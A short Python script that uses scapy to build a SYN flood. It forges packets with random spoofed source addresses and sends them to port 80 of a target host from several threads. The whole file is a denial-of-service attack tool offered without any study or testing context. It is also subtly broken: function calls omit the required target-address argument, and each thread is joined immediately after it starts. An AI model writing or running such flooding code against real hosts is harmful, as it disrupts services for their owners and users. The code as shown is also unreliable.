# -*- coding: utf-8 -*-
from scapy.all import *
import threading
import random

def gen_syn(total,dst_ip):
    for i in range(total):
        random_ip = '10.' + '200.' + '101.' + str(random.randrange(0, 255))
        random_sPort = random.randrange(10000, 65535)
        ip = IP(src=random_ip, dst=dst_ip)
        tcp = TCP(sport=random_sPort, dport=80, flags='S', seq=11111)
        pkt = (ip / tcp)
        yield pkt


def send_pkt(pkt_num,dst_ip):
    for pkt in gen_syn(pkt_num):
        send(pkt)



def syn_flood(num,total,dst_ip):
    pkt_num=int(total/num)
    for i in range(num):
        t=threading.Thread(target=send_pkt,args=(pkt_num,dst_ip))
        t.start()
        t.join()

syn_flood(2,2000)
